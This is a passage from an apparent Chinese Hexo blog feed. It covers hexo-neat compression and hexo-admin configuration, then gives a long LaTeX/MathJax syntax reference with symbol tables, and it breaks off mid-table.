<h2 id="压缩静态文件提高访问速度"><a href="#压缩静态文件提高访问速度" class="headerlink" title="压缩静态文件提高访问速度"></a>压缩静态文件提高访问速度</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn add hexo-neat	<span class="comment">#安装插件</span></span><br><span class="line">vim _config.yml		<span class="comment">#添加配置信息</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#静态文件压缩</span></span><br><span class="line"><span class="comment"># hexo-neat</span></span><br><span class="line"></span><br><span class="line"><span class="attr">neat_enable:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#压缩html</span></span><br><span class="line"><span class="attr">neat_html:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment">#跳过压缩</span></span><br><span class="line">  <span class="attr">exclude:</span></span><br><span class="line"><span class="comment">#压缩html时不要跳过.md文件和.swig文件（模块引擎文件）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#压缩css</span></span><br><span class="line"><span class="attr">neat_css:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">exclude:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;**/*.min.css&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#压缩js</span></span><br><span class="line"><span class="attr">neat_js:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">mangle:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">output:</span></span><br><span class="line">  <span class="attr">compress:</span></span><br><span class="line">  <span class="attr">exclude:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;**/*.min.js&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;**/index.js&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="Hexo-admin"><a href="#Hexo-admin" class="headerlink" title="Hexo-admin"></a>Hexo-admin</h2><p>可视化界面操作文章</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn add hexo-admin</span><br><span class="line">vim _config.yml</span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 管理配置</span></span><br><span class="line"><span class="attr">admin:</span></span><br><span class="line">  <span class="attr">username:</span> <span class="string">myfavoritename</span></span><br><span class="line">  <span class="attr">password_hash:</span> <span class="string">be121740bf988b2225a313fa1f107ca1</span></span><br><span class="line">  <span class="attr">secret:</span> <span class="string">a</span> <span class="string">secret</span> <span class="string">something</span></span><br></pre></td></tr></table></figure>
<p><code>password_hash</code> 是密码的哈希<br><code>secret</code> 用来保证<code>cookie</code>的安全，越长越复杂最好。</p>
<p>通过<code>http://localhost:4000/admin/</code>访问</p>
<p><a href="https://github.com/jaredly/hexo-admin">hexo-admin</a></p>
<p><a href="https://hexo.io/plugins/">hexo 插件</a></p>
]]></content>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>LaTex-Math（数学公式）语法</title>
    <url>/2019/10/06/LaTex-Math%EF%BC%88%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F%EF%BC%89%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<p><a href="#keng1">坑点1</a> <a href="#keng2">坑点2</a></p>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>  LaTex是一种基于TeX的排版系统，利用这种编排系统的处理，能快快速的生成数学公式<br>  TeX在学术界特别是数学、物理学和计算机科学界十分流行,TeX被普遍认为是一个优秀的排版工具，尤其是对于复杂数学公式的处理</p>
<p>  LaTex能通过简单的字符快熟生成想要的公式，<a href="https://www.mathjax.org/">MathJax</a>和<a href="https://katex.org/">KaTeX</a>是出名的两个编排引擎，这两个引擎都用了LaTex的语法编排公式。MathJax对TeX字符的支持最全，但加载公式慢；KaTeX加载公式的速度快，但支持的TeX字符相对短缺。</p>
<p>  现在大部分Markdown编辑器都支持对LaTex(MathJax)的渲染，就如Markdown文档语法一样，通过简单的LaTex语法就能事项美观的数学公式</p>
<a id="more"></a>
<h1 id="LaTex-Math语法"><a href="#LaTex-Math语法" class="headerlink" title="LaTex Math语法"></a>LaTex Math语法</h1><p>在Markdown中插入公式的两种方式</p>
<ul>
<li><strong>行间插入</strong>:</li>
</ul>
<p><strong><font id="keng1" color="#FF0000">坑:Kramed的行间代码和行间公式不兼容,对行间插入的兼容性也不太好</font></strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">`$语句$`</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>独占行插入</strong>:</li>
</ul>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">$$</span><br><span class="line">语句 </span><br><span class="line">$$</span><br></pre></td></tr></table></figure>
<h2 id="字符修饰"><a href="#字符修饰" class="headerlink" title="字符修饰"></a>字符修饰</h2><h3 id="上、下标"><a href="#上、下标" class="headerlink" title="上、下标"></a>上、下标</h3><ul>
<li><code>^</code>     :上标</li>
<li><code>_</code>     :下标</li>
</ul>
<p><strong>可用<code>&#123;&#125;</code>将长字符放到上下标的位置</strong><br><strong><code>&#123;&#125;</code>内不加字符能代表空白处，<font color="#FF0000">对其进行操作可起到在字符左边进行操作的目的</font></strong></p>
<h2 id><a href="#" class="headerlink" title></a><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">$x_1$</span><br><span class="line"></span><br><span class="line">$x_1^2$</span><br><span class="line"></span><br><span class="line">$x^2_1$</span><br><span class="line"></span><br><span class="line">$x_&#123;22&#125;^&#123;(n)&#125;$</span><br><span class="line"></span><br><span class="line">$x_&#123;balabala&#125;^&#123;bala&#125;$</span><br><span class="line"></span><br><span class="line">$$</span><br><span class="line">^*x^*</span><br><span class="line">$$</span><br><span class="line"></span><br></pre></td></tr></table></figure></h2><font color="#FF0000">**效果**:</font>

<p>$x_1$</p>
<p>$x_1^2$</p>
<p>$x^2_1$</p>
<p>$x_{22}^{(n)}$</p>
<p>$x_{balabala}^{bala}$</p>
<p><strong>Kramed渲染引擎对一些行间插入不兼容</strong></p>
<script type="math/tex; mode=display">
^*x^*</script><hr>
<h3 id="矢量"><a href="#矢量" class="headerlink" title="矢量"></a>矢量</h3><ul>
<li><code>\vec X</code>                             <font color="#FF0000"><strong>效果</strong></font>: $\vec X$</li>
<li><code>overrightarrow&#123;xy&#125;</code>     <font color="#FF0000"><strong>效果</strong></font>: $\overrightarrow{xy}$</li>
</ul>
<h3 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h3><p>对公式的某一部分字符进行字体转换，可以用 <code>&#123;\字体 &#123;需转换的部分字符&#125;&#125;</code> 命令,默认为意大利体(数学斜体)</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">输入</th>
<th style="text-align:center">说明</th>
<th style="text-align:center">显示</th>
<th style="text-align:center">输入</th>
<th style="text-align:center">说明</th>
<th style="text-align:center">显示</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">\rm</td>
<td style="text-align:center">罗马体</td>
<td style="text-align:center">$\rm{Eonun}$</td>
<td style="text-align:center">\cal</td>
<td style="text-align:center">花体</td>
<td style="text-align:center">$\cal {Eonun}$</td>
</tr>
<tr>
<td style="text-align:center">\it</td>
<td style="text-align:center">意大利体</td>
<td style="text-align:center">$\it{Eonun}$</td>
<td style="text-align:center">\Bbb</td>
<td style="text-align:center">黑板粗体</td>
<td style="text-align:center">$\Bbb{Eonun}$</td>
</tr>
<tr>
<td style="text-align:center">\bf</td>
<td style="text-align:center">粗体</td>
<td style="text-align:center">$\bf{Eonun}$</td>
<td style="text-align:center">\mit</td>
<td style="text-align:center">数学斜体</td>
<td style="text-align:center">$\mit{Eonun}$</td>
</tr>
<tr>
<td style="text-align:center">\sf</td>
<td style="text-align:center">等线体</td>
<td style="text-align:center">$\sf{Eonun}$</td>
<td style="text-align:center">\scr</td>
<td style="text-align:center">手写体</td>
<td style="text-align:center">$\scr{Eonun}$</td>
</tr>
<tr>
<td style="text-align:center">\tt</td>
<td style="text-align:center">打字机体</td>
<td style="text-align:center">$\tt{Eonun}$</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">\frak</td>
<td style="text-align:center">旧德式字体</td>
<td style="text-align:center">$\frak{Eonun}$</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
</div>
<h3 id="文字颜色"><a href="#文字颜色" class="headerlink" title="文字颜色"></a>文字颜色</h3><p>使用 <code>\color&#123;颜色&#125;&#123;文字&#125;</code> 来更改特定的文字颜色</p>
<p>常用颜色：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">silver</td>
<td style="text-align:center">$\color{silver}{eonun}$</td>
<td style="text-align:center">white</td>
<td style="text-align:center">$\color{white}{eonun}$</td>
</tr>
<tr>
<td style="text-align:center">black</td>
<td style="text-align:center">$\color{black}{eonun}$</td>
<td style="text-align:center">grey</td>
<td style="text-align:center">$\color{grey}{eonun}$</td>
</tr>
<tr>
<td style="text-align:center">maroon</td>
<td style="text-align:center">$\color{maroon}{eonun}$</td>
<td style="text-align:center">red</td>
<td style="text-align:center">$\color{red}{eonun}$</td>
</tr>
<tr>
<td style="text-align:center">yellow</td>
<td style="text-align:center">$\color{yellow}{eonun}$</td>
<td style="text-align:center">lime</td>
<td style="text-align:center">$\color{lime}{eonun}$</td>
</tr>
<tr>
<td style="text-align:center">olive</td>
<td style="text-align:center">$\color{olive}{eonun}$</td>
<td style="text-align:center">green</td>
<td style="text-align:center">$\color{green}{eonun}$</td>
</tr>
<tr>
<td style="text-align:center">teal</td>
<td style="text-align:center">$\color{teal}{eonun}$</td>
<td style="text-align:center">auqa</td>
<td style="text-align:center">$\color{auqa}{eonun}$</td>
</tr>
<tr>
<td style="text-align:center">blue</td>
<td style="text-align:center">$\color{blue}{eonun}$</td>
<td style="text-align:center">navy</td>
<td style="text-align:center">$\color{navy}{eonun}$</td>
</tr>
<tr>
<td style="text-align:center">purple</td>
<td style="text-align:center">$\color{purple}{eonun}$</td>
<td style="text-align:center">fuchsia</td>
<td style="text-align:center">$\color{fuchsia}{eonun}$</td>
</tr>
</tbody>
</table>
</div>
<p>其他色：</p>
<p>输入 <code>\color &#123; #rgb&#125; &#123;text&#125;</code> 来自定义更多的颜色，其中 <code>#rgb</code> 表示红色、绿色和蓝色的纯度（饱和度）</p>
<p><strong><font id="keng2" color="#FF0000">坑: <code>hexo</code>的博文中使用<code>&#123; #</code>（中间没空格）会解析冲突导致报错</font></strong>,使用<code>`用和`</code>将其包裹能解决</p>
<p><a href="http://tool.oschina.net/commons?type=3">RGB颜色表</a></p>
<h3 id="界定符"><a href="#界定符" class="headerlink" title="界定符"></a>界定符</h3><ul>
<li>小括号: <code>()</code>                     <font color="#FF0000"><strong>效果</strong></font>: $()$</li>
<li>中括号: <code>[]</code>                     <font color="#FF0000"><strong>效果</strong></font>: $[]$</li>
<li>尖括号: <code>\langle</code>、<code>\rangle</code>     <font color="#FF0000"><strong>效果</strong></font>: $\langle$  、 $\rangle$</li>
<li>大括号: <code>\&#123;\&#125;</code>                 <font color="#FF0000"><strong>效果</strong></font>: ${}$</li>
<li><p>竖线: </p>
<ul>
<li><code>|</code>                         <font color="#FF0000"><strong>效果</strong></font>:  $|$</li>
<li><code>\lvert值\rvert</code>             <strong>效果</strong>: $\lvert值\rvert$</li>
<li><code>\lVert值\rVert</code>             <strong>效果</strong>: $\lVert值\rVert$</li>
<li><code>\|</code> (双竖线)                 <strong>效果</strong>: $|$</li>
</ul>
</li>
<li><p>省略号: </p>
<ul>
<li><code>\dots</code>     :横省略号,偏下</li>
<li><code>\cdots</code>     :横省略号,偏上 </li>
<li><code>\vdots</code>     :竖省略号 </li>
<li><code>\ddots</code>     :斜省略号</li>
</ul>
<p><font color="#FF0000"> <strong>效果</strong> </font>:  $\dots$ , $\cdots$ , $\vdots$ , $\ddots$</p>
<p><code>\dots</code> 和 <code>\cdots</code> 的纵向位置不同，<strong>前者一般用于有下标的序列</strong></p>
</li>
</ul>
<h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><p>  LaTex语法会忽略空格，需用<code>\</code>转义空格</p>
<ul>
<li><code>\,</code> (小空格)             <code>a\,b</code>     <strong>效果</strong>: $a\,b$</li>
<li><code>\</code> (大空格)     <code>a\ b</code> <font color="#FF0000"><strong>效果</strong></font>: $a\ b$</li>
<li><code>\quad</code> (四个空格)         <code>a\quad b</code>     <font color="#FF0000"><strong>效果</strong></font>: $a\quad b$</li>
<li><p><code>\qquad</code> (八个空格)     <code>a\qquad b</code> <font color="#FF0000"><strong>效果</strong></font>: $a\qquad b$</p>
<ul>
<li>减距离: <code>\!</code>                 <code>a\!b</code>         <font color="#FF0000"><strong>效果</strong></font>: $a!b$      对比 $ab$</li>
</ul>
</li>
</ul>
<h3 id="大小控制"><a href="#大小控制" class="headerlink" title="大小控制"></a>大小控制</h3><ul>
<li>自适应: <code>\left自适应语\right句</code><ul>
<li><code>(\frac&#123;x&#125;&#123;y&#125;)</code>             <font color="#FF0000"><strong>效果</strong></font>: $(\frac{x}{y})$</li>
<li><code>\left(\frac&#123;x&#125;&#123;y&#125;\right)</code>     <font color="#FF0000"><strong>效果</strong></font>: $\left(\frac{x}{y}\right)$</li>
<li><code>\left[\frac&#123;x&#125;&#123;y&#125;\right]</code>     <font color="#FF0000"><strong>效果</strong></font>: $\left[\frac{x}{y}\right]$</li>
<li><code>\left[(\frac&#123;x&#125;&#123;y&#125;\right)]</code> <font color="#FF0000"><strong>效果</strong></font>: $\left[(\frac{x}{y}\right)]$</li>
</ul>
</li>
</ul>
<ul>
<li><p>指定大小: <code>big``Big``bigg``Bigg</code></p>
<p>可在后面加上<strong><code>l</code>的是左边，<code>r</code>的是右边，<code>big</code>等变为<code>bigl</code>代表左边的，变为<code>bigr</code>代表右边的，便于区分是那边的</strong></p>
</li>
</ul>
<h2 id="-1"><a href="#-1" class="headerlink" title></a><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">$$\Bigg(\bigg(\Big(\big((x)\big)\Big)\bigg)\Bigg)$$</span><br><span class="line"></span><br><span class="line">加&#96;l&#96;和&#96;r&#96;</span><br><span class="line">$$\Biggl(\biggl(\Bigl(\bigl((x)\bigr)\Bigr)\biggr)\Biggr)$$</span><br><span class="line"> </span><br><span class="line">$$\Biggl[\biggl[\Bigl[\bigl[[x]\bigr]\Bigr]\biggr]\Biggr]$$</span><br><span class="line"></span><br><span class="line">$$\Biggl \&#123;\biggl \&#123;\Bigl \&#123;\bigl \&#123;\&#123;x\&#125;\bigr \&#125;\Bigr \&#125;\biggr \&#125;\Biggr\&#125;$$</span><br><span class="line"></span><br><span class="line">$$\Biggl\langle\biggl\langle\Bigl\langle\bigl\langle\langle x</span><br><span class="line">\rangle\bigr\rangle\Bigr\rangle\biggr\rangle\Biggr\rangle$$</span><br><span class="line"></span><br><span class="line">$$\Biggl\lvert\biggl\lvert\Bigl\lvert\bigl\lvert\lvert x</span><br><span class="line">\rvert\bigr\rvert\Bigr\rvert\biggr\rvert\Biggr\rvert$$</span><br><span class="line"></span><br><span class="line">$$\Biggl\lVert\biggl\lVert\Bigl\lVert\bigl\lVert\lVert x</span><br><span class="line">\rVert\bigr\rVert\Bigr\rVert\biggr\rVert\Biggr\rVert$$</span><br><span class="line"></span><br><span class="line">$$\Biggl|\biggl|\Bigl|\bigl||x|\bigr|\Bigr|\biggr|\Biggr|$$</span><br><span class="line"></span><br><span class="line">$$\Bigg\|\bigg\|\Big\|\big\|\|$$</span><br><span class="line"></span><br></pre></td></tr></table></figure></h2><font color="#FF0000">  **效果**: </font>

<script type="math/tex; mode=display">\Bigg(\bigg(\Big(\big((x)\big)\Big)\bigg)\Bigg)</script><p>加<code>l</code>和<code>r</code></p>
<script type="math/tex; mode=display">\Biggl(\biggl(\Bigl(\bigl((x)\bigr)\Bigr)\biggr)\Biggr)</script><script type="math/tex; mode=display">\Biggl[\biggl[\Bigl[\bigl[[x]\bigr]\Bigr]\biggr]\Biggr]</script><script type="math/tex; mode=display">\Biggl \{\biggl \{\Bigl \{\bigl \{\{x\}\bigr \}\Bigr \}\biggr \}\Biggr\}</script><script type="math/tex; mode=display">\Biggl\langle\biggl\langle\Bigl\langle\bigl\langle\langle x
\rangle\bigr\rangle\Bigr\rangle\biggr\rangle\Biggr\rangle</script><script type="math/tex; mode=display">\Biggl\lvert\biggl\lvert\Bigl\lvert\bigl\lvert\lvert x
\rvert\bigr\rvert\Bigr\rvert\biggr\rvert\Biggr\rvert</script><script type="math/tex; mode=display">\Biggl\lVert\biggl\lVert\Bigl\lVert\bigl\lVert\lVert x
\rVert\bigr\rVert\Bigr\rVert\biggr\rVert\Biggr\rVert</script><script type="math/tex; mode=display">\Biggl|\biggl|\Bigl|\bigl||x|\bigr|\Bigr|\biggr|\Biggr|</script><script type="math/tex; mode=display">\Bigg\|\bigg\|\Big\|\big\|\|</script><hr>
<h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><h3 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
<th style="text-align:center">显示</th>
<th style="text-align:center">输入</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">\mid</td>
<td style="text-align:center">$\mid$</td>
<td style="text-align:center">\nmid</td>
<td style="text-align:center">$\nmid$</td>
</tr>
<tr>
<td style="text-align:center">\cdot</td>
<td style="text-align:center">$\cdot$</td>
<td style="text-align:center">\leq</td>
<td style="text-align:center">$\leq$</td>
</tr>
<tr>
<td style="text-align:center">\geq</td>
<td style="text-align:center">$\geq$</td>
<td style="text-align:center">\neq</td>
<td style="text-align:center">$\neq$</td>
</tr>
<tr>
<td style="text-align:center">\approx</td>
<td style="text-align:center">$\approx$</td>
<td style="text-align:center">\equiv</td>
<td style="text-align:center">$\equiv$</td>
</tr>
<tr>
<td style="text-align:center">\prec</td>
<td style="text-align:center">$\prec$</td>
<td style="text-align:center">\preceq</td>
<td style="text-align:center">$\preceq$</td>
</tr>
<tr>
<td style="text-align:center">\ll</td>
<td style="text-align:center">$\ll$</td>
<td style="text-align:center">\succ</td>
<td style="text-align:center">$\succ$</td>
</tr>
<tr>
<td style="text-align:center">\succeq</td>
<td style="text-align:center">$\succeq$</td>
<td style="text-align:center">\gg</td>
<td style="text-align:center">$\gg$</td>
</tr>
<tr>
<td style="text-align:center">\sim</td>
<td style="text-align:center">$\sim$</td>
<td style="text-align:center">\simeq</td>
<td style="text-align:center">$\simeq$</td>
</tr>
<tr>
<td style="text-align:center">\asymp</td>
<td style="text-align:center">$\asymp$</td>
<td style="text-align:center">\cong</td>
<td style="text-align:center">$\cong$</td>
</tr>
<tr>
<td style="text-align:center">\doteq</td>
<td style="text-align:center">$\doteq$</td>
<td style="text-align:center">\propto</td>
<td style="text-align:center">$\propto$</td>
</tr>
<tr>
<td style="text-align:center">\models</td>
<td style="text-align:center">$\models$</td>
<td style="text-align:center">\parallel</td>
<td style="text-align:center">$\parallel$</td>
</tr>
<tr>
<td style="text-align:center">\bowtie</td>
<td style="text-align:center">$\bowtie$</td>
<td style="text-align:center">\perp</td>
<td style="text-align:center">$\perp$</td>
</tr>
<tr>
<td style="text-align:center">\circ</td>
<td style="text-align:center">$\circ$</td>
<td style="text-align:center">\ast</td>
<td style="text-align:center">$\ast$</td>
</tr>
<tr>
<td style="text-align:center">\bigodot</td>
<td style="text-align:center">$\bigodot$</td>
<td style="text-align:center">\bigotimes</td>
<td style="text-align:center">$\bigotimes$</td>
</tr>
<tr>
<td style="text-align:center">\bigoplus</td>
<td style="text-align:center">$\bigoplus$</td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
</div>
<h3 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
<th style="text-align:center">显输入</th>
<th style="text-align:center">显示</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">\pm</td>
<td style="text-align:center">$\pm$</td>
<td style="text-align:center">\mp</td>
<td style="text-align:center">$\mp$</td>
</tr>
<tr>
<td style="text-align:center">\times</td>
<td style="text-align:center">$\times$</td>
<td style="text-align:center">\ast</td>
<td style="text-align:center">$\ast$</td>
</tr>
<tr>
<td style="text-align:center">\star</td>
<td style="text-align:center">$\star$</td>
<td style="text-align:center">\circ</td>
<td style="text-align:center">$\circ$</td>
</tr>
<tr>
<td style="text-align:center">\bullet</td>
<td style="text-align:center">$\bullet$</td>
<td style="text-align:center">\cdot</td>
<td style="text-align:center">$\cdot$</td>
</tr>
<tr>
<td style="text-align:center">\div</td>
<td style="text-align:center">$\div$</td>
<td style="text-align:center">\sum</td>
<td style="text-align:center">$\sum$</td>
</tr>
<tr>
<td style="text-align:center">\prod</td>
<td style="text-align:center">$\prod$</td>
<td style="text-align:center">\coprod</td>
<td style="text-align:center">$\coprod$</td>
</tr>
<tr>
<td style="text-align:center">\oplus</td>
<td style="text-align:center">$\oplus$</td>
<td style="text-align:center">\bigoplus</td>
<td style="text-align:center">$\bigoplus$</td>
</tr>
<tr>
<td style="text-align:center">\ominus</td>
<td style="text-align:center">$\ominus$</td>
<td style="text-align:center">\otimes</td>
<td style="text-align:center">$\otimes$</td>
</tr>
<tr>
<td style="text-align:center">\bigotimes</td>
<td style="text-align:center">$\bigotimes$</td>
<td style="text-align:center">\oslash</td>
<td style="text-align:center">$\oslash$</td>
</tr>
<tr>
<td style="text-align:center">\odot</td>
<td style="text-align:center">$\odot$</td>
<td style="text-align:center">\bigodot</td>
<td style="text-align:center">$\bigodot$</td>
</tr>
<tr>
<td style="text-align:center">\diamond</td>
<td style="text-align:center">$\diamond$</td>
<td style="text-align:center">\bigtriangleup</td>
<td style="text-align:center">$\bigtriangleup$</td>
</tr>
<tr>
<td style="text-align:center">\bigtriangledown</td>
<td style="text-align:center">$\bigtriangledown$</td>
<td style="text-align:center">\triangleleft$</td>
<td style="text-align:center">$\triangleleft$$</td>
</tr>
<tr>
<td style="text-align:center">\triangleright</td>
<td style="text-align:center">$\triangleright$</td>
<td style="text-align:center">\triangleright</td>
<td style="text-align:center">$\triangleright$</td>
</tr>
<tr>
<td style="text-align:center">\bigcirc</td>
<td style="text-align:center">$\bigcirc$</td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
</div>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h4 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">\emptyset</td>
<td style="text-align:center">$\emptyset$</td>
<td style="text-align:center">\in</td>
<td style="text-align:center">$\in$</td>
<td style="text-align:center">\notin</td>
<td style="text-align:center">$\notin$</td>
</tr>
<tr>
<td style="text-align:center">\subset</td>
<td style="text-align:center">$\subset$</td>
<td style="text-align:center">\supset</td>
<td style="text-align:center">$\supset$</td>
<td style="text-align:center">\subseteq</td>
<td style="text-align:center">$\subseteq$</td>
</tr>
<tr>
<td style="text-align:center">\supseteq</td>
<td style="text-align:center">$\supseteq$</td>
<td style="text-align:center">\bigcap</td>
<td style="text-align:center">$\bigcap$</td>
<td style="text-align:center">\bigcup</td>
<td style="text-align:center">$\bigcup$</td>
</tr>
<tr>
<td style="text-align:center">\bigvee</td>
<td style="text-align:center">$\bigvee$</td>
<td style="text-align:center">\bigwedge</td>
<td style="text-align:center">$\bigwedge$</td>
<td style="text-align:center">\biguplus</td>
<td style="text-align:center">$\biguplus$</td>
</tr>
</tbody>
</table>
</div>
<h4 id="对数"><a href="#对数" class="headerlink" title="对数"></a>对数</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">\log</td>
<td style="text-align:center">$\log$</td>
<td style="text-align:center">\lg</td>
<td style="text-align:center">$\lg$</td>
<td style="text-align:center">\ln</td>
<td style="text-align:center">$\ln$</td>
</tr>
</tbody>
</table>
</div>
<h4 id="三角"><a href="#三角" class="headerlink" title="三角"></a>三角</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">30^\circ</td>
<td style="text-align:center">$\circ$</td>
<td style="text-align:center">\bot</td>
<td style="text-align:center">$\bot$</td>
<td style="text-align:center">\angle A</td>
<td style="text-align:center">$\angle A$</td>
</tr>
<tr>
<td style="text-align:center">\sin</td>
<td style="text-align:center">$\sin$</td>
<td style="text-align:center">\cos</td>
<td style="text-align:center">$\cos$</td>
<td style="text-align:center">\tan</td>
<td style="text-align:center">$\tan$</td>
</tr>
<tr>
<td style="text-align:center">\csc</td>
<td style="text-align:center">$\csc$</td>
<td style="text-align:center">\sec</td>
<td style="text-align:center">$\sec$</td>
<td style="text-align:center">\cot</td>
<td style="text-align:center">$\cot$</td>
</tr>
</tbody>
</table>
</div>
<h4 id="微积分"><a href="#微积分" class="headerlink" title="微积分"></a>微积分</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">\int</td>
<td style="text-align:center">$\int$</td>
<td style="text-align:center">\iint</td>
<td style="text-align:center">$\iint$</td>
<td style="text-align:center">\iiint</td>
<td style="text-align:center">$\iiint$</td>
</tr>
<tr>
<td style="text-align:center">\iiiint</td>
<td style="text-align:center">$\iiiint$</td>
<td style="text-align:center">\oint</td>
<td style="text-align:center">$\oint$</td>
<td style="text-align:center">\prime</td>
<td style="text-align:center">$\prime$</td>
</tr>
<tr>
<td style="text-align:center">\lim</td>
<td style="text-align:center">$\lim$</td>
<td style="text-align:center">\infty</td>
<td style="text-align:center">$\infty$</td>
<td style="text-align:center">\nabla</td>
<td style="text-align:center">$\nabla$</td>
</tr>
</tbody>
</table>
</div>
<h4 id="逻辑"><a href="#逻辑" class="headerlink" title="逻辑"></a>逻辑</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">\forall</td>
<td style="text-align:center">$\forall$</td>
<td style="text-align:center">\exists</td>
<td style="text-align:center">$\exists$</td>
<td style="text-align:center">\not\subset</td>
<td style="text-align:center">$\not\subset$</td>
</tr>
<tr>
<td style="text-align:center">\not&lt;</td>
<td style="text-align:center">$\not&lt;$</td>
<td style="text-align:center">\not&gt;</td>
<td style="text-align:center">$\not&gt;$</td>
<td style="text-align:center">\not=</td>
<td style="text-align:center">$\not=$</td>
</tr>
<tr>
<td style="text-align:center">\because</td>
<td style="text-align:center">$\because$</td>
<td style="text-align:center">\therefore</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
</div>
<h4 id="字符帽"><a href="#字符帽" class="headerlink" title="字符帽"></a>字符帽</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">\hat{xy}</td>
<td style="text-align:center">$\hat{xy}$</td>
<td style="text-align:center">\widehat{xyz}</td>
<td style="text-align:center">$\widehat{xyz}$</td>
</tr>
<tr>
<td style="text-align:center">\tilde{xy}</td>
<td style="text-align:center">$\tilde{xy}$</td>
<td style="text-align:center">\widetilde{xyz}</td>
<td style="text-align:center">$\widetilde{xyz}$</td>
</tr>
<tr>
<td style="text-align:center">\check{x}</td>
<td style="text-align:center">$\check{x}$</td>
<td style="text-align:center">\breve{y}</td>
<td style="text-align:center">$\breve{y}$</td>
</tr>
<tr>
<td style="text-align:center">\grave{x}</td>
<td style="text-align:center">$\grave{x}$</td>
<td style="text-align:center">\acute{y}</td>
<td style="text-align:center">$\acute{y}$</td>
</tr>
</tbody>
</table>
</div>
<h4 id="连线"><a href="#连线" class="headerlink" title="连线"></a>连线</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">\fbox{a+b+c+d}</td>
<td style="text-align:center">$\fbox{a+b+c+d}$</td>
</tr>
<tr>
<td style="text-align:center">\overleftarrow{a+b+c+d}</td>
